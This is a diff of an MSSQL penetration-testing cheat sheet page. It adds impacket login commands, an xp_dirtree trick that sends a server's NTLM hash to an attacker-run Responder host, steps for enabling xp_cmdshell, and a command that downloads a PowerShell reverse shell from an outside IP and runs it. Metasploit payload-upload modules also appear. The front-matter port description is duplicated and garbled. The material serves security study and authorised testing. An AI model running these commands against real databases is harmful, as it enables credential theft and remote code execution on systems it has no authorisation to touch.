@@ -1,3 +1,7 @@
+---
+description: (TCP 1433-4, 135/UDP 143)(TCP 1433-4, 135/UDP 143)
+---
+
 # MSSQL
 
 ## :information\_source: Introduction
@@ -11,8 +15,9 @@ By default, the typical ports used by SQL Server and associated database engine 
 * [ ] Try to query the DB if you have creds
 * [ ] heck for DAC (Dedicated Access Connection)
 * [ ] Login brute force
-* [ ] Setup a fake MSSQL server and gather NTLM hashes
-*
+* [ ] Try NTLM relay with a fake SMB server
+* [ ] If you can get access, check for privilege escalation methods to gain admin access to DB
+* [ ] Check for CVEs
 
 ## Enumeration
 
@@ -50,7 +55,9 @@ The DAC feature is accessible on the loopback adapter per default, but can be ac
 sudo nmap -sU -p 1434 --script ms-sql-dac <ip>
 ```
 
-## Query the DB (with credentials)
+![](<../../.gitbook/assets/image (276).png>)
+
+## Query (with credentials)
 
 ### Automated
 
@@ -128,6 +135,32 @@ msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload
 msf> use windows/manage/mssql_local_auth_bypass
 ```
 
+#### impacket mssqlclient:
+
+```
+mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> #Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine
+​
+#Once logged in you can run queries:
+SQL> select @@ version;
+​
+#Steal NTLM hash
+sudo responder -I <interface> #Run that in other console
+SQL> exec master..xp_dirtree '\\<YOUR_RESPONDER_IP>\test' #Steal the NTLM hash, crack it with john or hashcat
+​
+#Try to enable code execution
+SQL> enable_xp_cmdshell
+​
+#Execute code, 2 sintax, for complex and non complex cmds
+SQL> xp_cmdshell whoami /all
+SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'
+```
+
+#### sqsh
+
+```
+sqsh -S <IP> -U <Username> -P <Password> -D <Database>
+```
+
 ### Manual
 
 #### Local:
@@ -144,10 +177,6 @@ Remote:
 mysql -h <Hostname> -u root
 mysql -h <Hostname> -u user@target-host
 ```
-
-
-
-![](<../../.gitbook/assets/image (276).png>)
 
 ## MSSQL - SMB Relay Attack
 
@@ -171,9 +200,11 @@ set username db1_owner
 set password MyPassword!
 ```
 
+## Stored Procedures (user impersonation)
 
+This technique is mostly used for privilege escalation.
 
-
+{% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-stored-procedures-part-2-user-impersonation" %}
 
 
 
